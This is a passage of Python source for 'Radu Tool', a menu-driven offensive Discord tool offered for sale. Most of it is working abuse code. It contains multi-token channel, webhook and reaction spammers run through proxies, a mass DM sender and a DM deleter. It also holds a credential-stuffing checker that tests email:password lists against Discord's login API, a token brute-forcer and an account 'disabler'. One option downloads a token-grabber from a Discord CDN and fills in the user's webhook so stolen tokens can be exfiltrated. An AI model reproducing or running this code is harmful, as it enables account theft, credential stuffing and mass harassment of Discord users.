        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Ticket Spammer [Paid Version]')
        print(f"\n{purple}[{red}!{purple}]{reset} Ticket Spammer Is On Radu Tool Paid Version...")
        Write.Print(f"""
[1] Visit Shop
[2] What Does It Contain?
[3] Back
        """, Colors.purple_to_red, interval=0.000)
        shop = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if shop=="1":
            webbrowser.open('https://radutool.sellix.io')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="2":
            print(f"\n{purple}[{red}>{purple}]{reset} This ticket spammer tries that with a list of tokens, you start creating channels without permissions using the tickettool.xyz bot or Ticket King, you can create +30 channels per minute / token.")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="3":
            radutool2()
    if opc=="49":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Channel Lagger')
        def raider():  
            channel7 = input(f"\n{purple}[{red}>{purple}]{reset} Channel ID : ")
            mess7 = input(f"{purple}[{red}>{purple}]{reset} Message : ")
            radulist = ['😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴', '😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴']
            delay = "0"
            tokens = open("tokens.txt", "r").read().splitlines()
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            def spam(token, channel7, mess7):
                url = f"https://discord.com/api/v9/channels/{channel7}/messages"
                while True:
                    caracteres = string.ascii_letters + string.digits
                    selected_emojis = random.sample(radulist, 70)
                    selected_emojis_str = ' '.join(selected_emojis)
                    data = {"content": f"|| Radu Tool Runs Cord || ººº - ```{mess7}``` - {selected_emojis_str} - || Download Radu Tool Right Now! || ~ ```RaduTool Owns Discord``` **__Download Right Now!__**!!!!!!!!!!!!!!!!!"}
                    header = {"authorization": token}
                    time.sleep(0.0001)
                    r = requests.post(url, data=data, headers=header, proxies=proxies)
                    if r.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")              
            def thread():
                channel_id = channel7
                text = mess7
                for token in tokens:
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id, text)).start()
            thread()                         
        raider()
    if opc=="50":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Webhook Embeds')
        webhook = input(f"\n{purple}[{red}>{purple}]{reset} Webhook : ")
        desc = input(f"{purple}[{red}>{purple}]{reset} Description : ")
        title = input(f"{purple}[{red}>{purple}]{reset} Webhook Title : ")
        text = input(f"{purple}[{red}>{purple}]{reset} Text : ")
        name = input(f"{purple}[{red}>{purple}]{reset} Author Name : ")
        icon_url = input(f"{purple}[{red}>{purple}]{reset} Icon URL : ")
        field1 = input(f"{purple}[{red}>{purple}]{reset} Field Name : ")
        value = input(f"{purple}[{red}>{purple}]{reset} Field Value : ")
        if icon_url == "" or " ":
            icon_url = ""
        elif field1 == "" or " ":
            field1 = ""
        elif value == "" or " ":
            value = ""
        webhook_url = f'https://discord.com/api/webhooks/{webhook}'
        embed = {
            'title': title,
            'description': desc,
            'color': 13632027,
            'footer': {
                'text': text
            },
            'author': {
                'name': name,
                'icon_url': icon_url
            },
            'thumbnail': {
                'url': ''
            },
            'fields': [
                {
                    'name': field1,
                    'value': value,
                    'inline': False
                }
            ]
        }

        payload = {
            'embeds': [embed]
        }
        response = requests.post(webhook_url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
        if response.status_code == 204:
            print(f'{purple}[{green}+{purple}]{reset} Successfully Sent Message')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        else:
            print(f'{purple}[{red}-{purple}]{reset} Error Sending Message | {blue}{response.text}')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
    if opc=="51":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Reaction Spammer')
        def emojispam(token, channel, message, emoji):
            url = f'https://discord.com/api/v9/channels/{channel}/messages/{message}/reactions/{emoji}/@me'
            headers = {
                'Authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            response = requests.put(url, headers=headers)
            if response.status_code == 204:
                print(f'{purple}[{green}+{purple}]{reset} Successfully Added Emoji | {blue}{token}')
                pass
            else:
                print(f'{purple}[{red}-{purple}]{reset} Failed Adding Emoji | {blue}{token}')
                pass
        def reactionspammer():
            emoji = input(f'\n{purple}[{red}>{purple}]{reset} Emoji : ') 
            channel = input(f'{purple}[{red}>{purple}]{reset} Channel ID : ') 
            message= input(f'{purple}[{red}>{purple}]{reset} Message ID : ')
            with open(f'tokens.txt', 'r') as token:
                tokens = [line.strip() for line in token]   
            threads = []
            for token in tokens:
                thread = threading.Thread(target=emojispam, args=(token, channel, message, emoji))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
        reactionspammer()
    if opc=="52":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Boost Tool [Paid Version]')
        print(f"\n{purple}[{red}!{purple}]{reset} Ticket Spammer Is On Radu Tool Paid Version...")
        Write.Print(f"""
[1] Visit Shop
[2] What Does It Contain?
[3] Back
        """, Colors.purple_to_red, interval=0.000)
        shop = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if shop=="1":
            webbrowser.open('https://radutool.sellix.io')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="2":
            print(f"\n{purple}[{red}>{purple}]{reset} This tool automatically boosts a server or several, with the tokens that have nitro, removes the tokens that do not have nitro and are approximately 500 boosts per minute (if you have many tokens)")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="3":
            radutool2()
    if opc=="53":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Multi Webhook Spammer')
        def radu(webhook, message, username):
            session = requests.Session()
            print(f"{purple}[{green}+{purple}]{reset} Sent Message | {blue}{webhook}")
            session.post(webhook,json = {"content":message,"username":username})
            while True:
                for i in range(1000000000):
                    threading.Thread(target=radu, args=(webhook, message, username)).start()

        webhooks = open('data/webhooks.txt', 'r').readlines()
        message = input(f"\n{purple}[{red}>{purple}]{reset} Message : ")
        username = input(f"{purple}[{red}>{purple}]{reset} Webhook Username : ")

        for webhook in webhooks:
            threading.Thread(target=radu, args=(webhook.strip(), message, username)).start()
    if opc=="54":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | DM Sender')
        def massDM(token, content):
            headers = {
                'Authorization': token
                }
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
            for channel in channelIds:
                try:
                    requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                    headers=headers,
                    data= {
                        "content": f"{content}"
                        })
                    print(f"{purple}[{green}+{purple}]{reset} Sent DM | {blue}"+channel['id'])
                except Exception as e:
                    print(f"{purple}[{red}-{purple}]{reset} Error | {blue}{e}")
                    pass
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        message = input(f"{purple}[{red}>{purple}]{reset} Message : ")
        massDM(token=token, content=message)
    if opc=="55":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Discord Account Checker')
        unverified = 0
        valid = 0
        bad = 0
        with open("data/accounts.txt") as f:
            lines = f.readlines()

        for line in lines:
            email, password = line.strip().split(":")
            r = requests.post("https://discord.com/api/v9/auth/login", json={"email": email, "password": password})
            if r.status_code == 200:
                print(f"{purple}[{green}+{purple}]{reset} Valid Account & Password | {blue}{email}:{password}")
                valid += 1
            if r.status_code == 429:
                print(f"{purple}[{yellow}%{purple}]{reset} Unverified Account & Password | {blue}{email}:{password}")
                unverified += 1
            else:
                print(f"{purple}[{red}-{purple}]{reset} Invalid Account & Password | {blue}{email}:{password}")
                bad += 1
        Write.Print(f"\n\t\t\t\t\t\tAccount Checker Stats : \n", Colors.purple_to_red, interval=0.000)
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_red, interval=0.000)
        print(f"\t\t\t\t\tValid : [{green}{valid}{reset}] | Invalid : [{red}{bad}{reset}] | Unverified : [{yellow}{unverified}{reset}]")
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        System.Clear()
        radutool2()
    if opc=="56":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | PFP Changer')
        def changer():
            def change_pfp():
                tokens = open('tokens.txt', 'r').read().splitlines()
                token = random.choice(tokens)
                picture = glob.glob("data/Avatars/*.jpg") + glob.glob("data/Avatars/*.jpeg") + glob.glob("data/Avatars/*.png")
                random_picture = random.choice(picture)
                with open(f'data/Avatars/{random_picture}', "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read())

                headers = {
                'Authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
                json = {
                    'avatar': f"data:image/png;base64,{(encoded_string.decode('utf-8'))}",
                }
                response = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=json)
                if response.status_code == 200:
                    print(f'{purple}[{green}+{purple}]{reset} Successfully Changed PFP | {blue}{token}')
                else:
                    print(f'{purple}[{red}-{purple}]{reset} Error Changing PFP | {blue}{token}')
            amount = 100
            for i in range(int(amount)):
                threading.Thread(target=change_pfp).start()
        changer()
    if opc=="57":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | DM Deleter')
        Token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        print()
        def dms_close(Token):
            headers = {"authorization": Token, 
                       "user-agent": "Samsung Fridge/6.9"
                       }
            close_dm_request = requests.get(
                "https://canary.discord.com/api/v9/users/@me/channels", headers=headers).json()
            vale = 0
            for channel in close_dm_request:
                vale += 1
                print(f"{purple}[{green}+{purple}]{reset} Deleted DM | [{blue}{vale}{reset}]")
                requests.delete(
                    f"https://canary.discord.com/api/v9/channels/{channel['id']}",
                    headers=headers,
                )
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        dms_close(Token)
    if opc=="58":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Discord Temp Mail')
        url = 'https://tempmail.net/en/'
        response = requests.get(url)
        email = response.text.split('id="mail" value="')[1].split('"')[0]
        api_url = f'https://tempmail.net/en/api/mailbox/{email}/'
        print(f"\n{purple}[{green}+{purple}]{reset} Generated Temp-Mail | {blue}{email}")
        time.sleep(5)
        while True:
            response = requests.get(api_url)
            emails = response.json()
            if len(emails) > 0:
                print(f'{purple}[{green}+{purple}]{reset} New Mail Found : ')
                print(f"{purple}[{green}+{purple}]{reset} ",emails[0])
            time.sleep(10)
    if opc=="59":
        # Grabber Not By H4cK3dR4Du! I Got it from a friend!! (Nyx)
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Grabber')
        def downloadGrabber(webhook):
            url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
            r = requests.get(url, allow_redirects=True)
            folder = "Results"
            if not os.path.exists(folder):
                os.makedirs(folder)
            open('Results/grabber.py', 'w', encoding='utf-8').write(r.content.decode().replace("WEBHOOK HERE", webhook))
            print(f"\n{purple}[{green}+{purple}]{reset} Successfully Downloaded Grabber | {blue}Results/grabber.py")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        webhook = input(f"\n{purple}[{red}>{purple}]{reset} Webhook : ")
        downloadGrabber(webhook)
    if opc=="60":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Information')
        def tokenInfo(token):
            headers = {
                'Authorization': token, 
                'Content-Type': 'application/json'
                    }  
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                    badges = ""
                    Discord_Employee = 1
                    Partnered_Server_Owner = 2
                    HypeSquad_Events = 4
                    Bug_Hunter_Level_1 = 8
                    House_Bravery = 64
                    House_Brilliance = 128
                    House_Balance = 256
                    Early_Supporter = 512
                    Bug_Hunter_Level_2 = 16384
                    Early_Verified_Bot_Developer = 131072

                    flags = r.json()['flags']
                    if (flags == Discord_Employee):
                        badges += "Staff, "
                    if (flags == Partnered_Server_Owner):
                        badges += "Partner, "
                    if (flags == HypeSquad_Events):
                        badges += "Hypesquad Event, "
                    if (flags == Bug_Hunter_Level_1):
                        badges += "Green Bughunter, "
                    if (flags == House_Bravery):
                        badges += "Hypesquad Bravery, "
                    if (flags == House_Brilliance):
                        badges += "HypeSquad Brillance, "
                    if (flags == House_Balance):
                        badges += "HypeSquad Balance, "
                    if (flags == Early_Supporter):
                        badges += "Early Supporter, "
                    if (flags == Bug_Hunter_Level_2):
                        badges += "Gold BugHunter, "
                    if (flags == Early_Verified_Bot_Developer):
                        badges += "Verified Bot Developer, "
                    if (badges == ""):
                        badges = "None"
                    userName = r.json()['username'] + '#' + r.json()['discriminator']
                    userID = r.json()['id']
                    phone = r.json()['phone']
                    email = r.json()['email']
                    language = r.json()['locale']
                    avatar_id = r.json()['avatar']
                    avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
                    mfa = r.json()['mfa_enabled']
                    res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token))
                    nitro_data = res.json()
                    nitro = bool(len(nitro_data) > 0)
                    if nitro:
                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
                    print(f'''
{purple}[{green}+{purple}]{reset} User ID | {blue}{userID}
{purple}[{green}+{purple}]{reset} Username | {blue}{userName}
{purple}[{green}+{purple}]{reset} A2F | {blue}{mfa}
{purple}[{green}+{purple}]{reset} Email | {blue}{email}
{purple}[{green}+{purple}]{reset} Phone Number | {blue}{phone if phone else "None"}
{purple}[{green}+{purple}]{reset} Token | {blue}{token}
{purple}[{green}+{purple}]{reset} Nitro | {blue}{nitro}
{purple}[{green}+{purple}]{reset} Avatar URL | {blue}{avatar_url if avatar_id else ""}
{purple}[{green}+{purple}]{reset} Nitro Expires In | {blue}{days_left if nitro else "0"} day(s)
{purple}[{green}+{purple}]{reset} Badges | {blue}{badges}
''')
                    input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
                    radutool2()
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        tokenInfo(token)
def radutool():
    tokens = len(open('tokens.txt').readlines())
    System.Clear()
    ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Tokens : [{tokens}]')
    Write.Print(f'''
    \t\t     /$$$$$$$                  /$$                 /$$$$$$$$                  /$$
    \t\t    | $$__  $$                | $$                |__  $$__/                 | $$
    \t\t    | $$  \ $$  /$$$$$$   /$$$$$$$ /$$   /$$         | $$  /$$$$$$   /$$$$$$ | $$
    \t\t    | $$$$$$$/ |____  $$ /$$__  $$| $$  | $$         | $$ /$$__  $$ /$$__  $$| $$
    \t\t    | $$__  $$  /$$$$$$$| $$  | $$| $$  | $$         | $$| $$  \ $$| $$  \ $$| $$
    \t\t    | $$  \ $$ /$$__  $$| $$  | $$| $$  | $$         | $$| $$  | $$| $$  | $$| $$ 
    \t\t    | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$
    \t\t    |__/  |__/ \_______/ \_______/ \______/          |__/ \______/  \______/ |__/    
    \t\t\t[ > discord.gg/radutool | Welcome {username} | github.com/H4cK3dR4Du < ]\n''', Colors.purple_to_red, interval=0.000)
    Write.Print(f"""════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
\t\t[1] Token Checker\t\t[11] Channel Spammer\t\t[21] Nitro Promo Checker
\t\t[2] Token Bruteforce\t\t[12] Nickname Changer\t\t[22] Nitro Generator
\t\t[3] Webhook Nuker\t\t[13] Voice Pinger\t\t[23] Vanity Checker
\t\t[4] Webhook Spammer\t\t[14] Server Leaver\t\t[24] Keyword Server Finder
\t\t[5] Token Disabler\t\t[15] Fastest BanAll\t\t[25] Webhook Checker
\t\t[6] Member ID Scraper\t\t[16] Nitro Checker\t\t[26] Block All Friends
\t\t[7] Reply Spammer\t\t[17] Token Grabber Detector\t[27] MassDM Bot
\t\t[8] Webhook Creator\t\t[18] Status Changer\t\t[28] Friend Deleter
\t\t[9] Thread Spammer\t\t[19] Server Joiner\t\t[29] Webhook Generator
\t\t[10] Voice Joiner\t\t[20] Nitro Promo Generator\t[>] """, Colors.purple_to_red, interval=0.000), print(f"{pink} Next Page")
    Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
    Write.Print(f"\nroot@radutool ~> ", Colors.purple_to_red, interval=0.000); opc = input(purple)
    option_list = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", ">"]
    exit_list = ["exit", "esc", "bye", "stop", "close", "x", ".gg/radutool"]
    if opc not in option_list:
        print(f"\n{purple}[{red}Error{purple}]{reset} Invalid Option!")
        time.sleep(0.5)
        radutool()
    if opc in exit_list:
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Tokens : [{tokens}] | Goodbye! ♥ ')
        while True:
            System.Clear()
            seconds = 3
            Write.Print(f"""
    —–-—▒▒▒▒▒▒▒▒▒▒
    —–-▒███████████▒
    —▒████▒▒▒▒▒▒▒███▒
    -▒████▒▒▒▒▒▒▒▒▒███▒……………….▒▒▒▒▒▒
    -▒███▒▒▒▒▒███▒▒▒███▒…………..▒██████▒
    -▒███▒▒▒▒██████▒▒███▒……….▒██▒▒▒▒██▒         [ Made By H4cK3dR4Du#0001 ]
    —▒███▒▒▒███████▒▒██▒…….▒███▒▒█▒▒██▒         [ Discord : discord.gg/radutool ]
    —–▒███▒▒████████▒██▒…▒███▒▒███▒▒██▒         [ Thanks For Using My Tool ♥ ]
    ——–▒██▒▒██████████▒▒███▒▒████▒▒██▒
    ———▒██▒▒██████████████▒████▒▒██▒
    ———-▒██▒▒█████████████████▒▒██▒             [ Github : https://github.com/H4cK3dR4Du ]
    ————▒██▒▒██████████████▒▒██▒                [ Youtube : https://youtube.com/@H4cK3dR4Du ]
    ————–▒██▒▒████████████▒▒██▒                 [ TikTok : https://www.tiktok.com/@radutool ]
    —————-▒██▒▒██████████▒▒██▒                  
    —————–▒██▒▒████████▒▒██▒                    
    ——————-▒██▒▒██████▒▒██▒                     [ {username} ]
    ———————▒██▒▒████▒▒██▒                       [ RaduTool V3.6 ]
    ———————-▒██▒▒███▒▒█▒                        
    ————————▒██▒▒█▒▒█▒
    ————————-▒██▒▒▒█▒                           [ Exit In : {seconds}s ]
    —————————▒██▒█▒                             [ Goodbye! ]
    —————————♥♥♥♥♥♥                             
    —————————-♥♥♥♥♥
    ——————————♥♥♥
    —————————-—♥♥
    ———————————♥
            """, Colors.purple_to_red, interval=0.000)
            time.sleep(3)
            exit()
    if opc=="1":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Checker')
        print()
        valid = 0
        invalid = 0
        unverify = 0
        unknown = 0
        with open('tokens.txt', 'r') as f:
            tokens = f.read().splitlines()

        for token in tokens:
            headers = {
                'Authorization': token
                }
            response = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)

            if response.status_code == 200:
                print(f'{purple}[{green}+{purple}]{reset} {green}Valid {reset}| {blue}{token}')
                valid += 1
            elif response.status_code == 401:
                print(f'{purple}[{red}-{purple}]{reset} {red}Invalid {reset}| {blue}{token}')
                invalid += 1
                tokens.remove(token)
            elif response.status_code == 429:
                print(f'{purple}[{yellow}%{purple}]{reset} {yellow}Unverified {reset}| {blue}{token}')
                unverify += 1
                tokens.remove(token)
            else:
                print(f'{purple}[{red}-{purple}]{reset} {red}Unknown {reset}| {blue}{token}')
                unknown += 1
                tokens.remove(token)
        Write.Print(f"\n\t\t\t\t\t\tToken Checker Stats : \n", Colors.purple_to_red, interval=0.000)
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_red, interval=0.000)
        print(f"\t\t\tValid : [{green}{valid}{reset}] | Invalid : [{red}{invalid}{reset}] | Unverified : [{yellow}{unverify}{reset}] | Unknown : [{blue}{unknown}{reset}]")
        Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        System.Clear()
        radutool()
    if opc=="2":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Bruteforce')
        id_to_token = base64.b64encode((input(f"\n{purple}[{red}>{purple}]{reset} User ID : ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]
        print(f"\n{purple}[{red}>{purple}]{reset} Scraped Half Token! [{yellow}{id_to_token}{reset}]")
        time.sleep(2)
        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} {green}Valid {reset}| {blue}{token}')
                        f = open(f'data/token-brute.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print(f'{purple}[{red}-{purple}]{reset} {red}Invalid {reset}| {blue}{token}')
                finally:
                    pass

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()
        thread()
    if opc=="3":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Webhook Nuker')
        webhook = input(f"\n{purple}[{red}>{purple}]{reset} Webhook : ")
        response = requests.delete(webhook)
        print(f"\n{purple}[{green}+{purple}]{reset} Successfully Nuked | {blue}{webhook[:70]}*****")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool()
    if opc=="4":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Webhook Spammer')
        url = input(f"\n{purple}[{red}>{purple}]{reset} Webhook : ")
        message = input(F"{purple}[{red}>{purple}]{reset} Message : ")
        print()

        datos = {
            "content": message
        }

        datos_json = json.dumps(datos)

        headers = {
            "Content-Type": "application/json"
        }

        while True:
            time.sleep(0.001)
            response = requests.post(url, data=datos_json, headers=headers)
            print(f"{purple}[{green}+{purple}]{reset} Successfully Sent Message | {blue}{message}")
    if opc=="5":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Disabler')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        print()

        with open('Data/disabler.txt', 'r') as f:
            member_ids = f.read().splitlines()

        headers = {
            'Authorization': f'{token}',
            'Content-Type': 'application/json'
        }

        for member_id in member_ids:
            data = {
                'recipient_id': member_id
            }
            response = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, data=json.dumps(data))
            if response.status_code == 200:
                print(f'{purple}[{green}+{purple}]{reset} Request Opened - {member_id}')
            else:
                print(f'{purple}[{green}+{purple}]{reset} Succesfully Disabled | {blue}{token}')
                input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
                radutool()
    if opc=="6":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Member ID Scraper')
        success = 0
        failed = 0
        guild = input(f"\n{purple}[{red}>{purple}]{reset} Server ID : ")
        channel = input(f"{purple}[{red}>{purple}]{reset} Channel ID : ")
        token = input(f"{purple}[{red}>{purple}]{reset} Token : ")
        headers = {'Authorization': token}
        response = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            print(f'\n{purple}[{green}+{purple}]{reset} {green}Valid Token {reset}| {blue}{token}')
            time.sleep(1)
            pass
        elif response.status_code == 401:
            print(f'\n{purple}[{red}-{purple}]{reset} {red}Invalid Token {reset}| {blue}{token}')
            time.sleep(1)
            radutool()
        discumclient = discum.Client(token=token)
